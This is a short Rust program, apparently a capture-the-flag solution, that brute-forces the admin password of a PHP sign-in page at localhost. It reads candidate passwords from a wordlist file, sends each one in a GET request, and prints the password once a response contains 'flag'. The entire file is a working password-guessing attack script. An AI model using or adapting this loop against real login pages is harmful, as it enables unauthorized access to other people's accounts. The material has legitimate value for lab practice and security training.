use std::{env, fs::read_to_string};

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 2 {
        return;
    }
    let filename = &args[1];
    let file = read_to_string(filename).expect("Fail to read");
    for el in file.lines() {
        let url = format!(
            "http://localhost:8080/index.php?page=signin&username=admin&password={}&Login=Login#",
            el
        );
        if let Ok(res) = reqwest::blocking::get(url) {
            let text = res.text().unwrap();
            if text.contains("flag") {
                println!("MDP = {el}");
                return;
            }
        }
    }
}
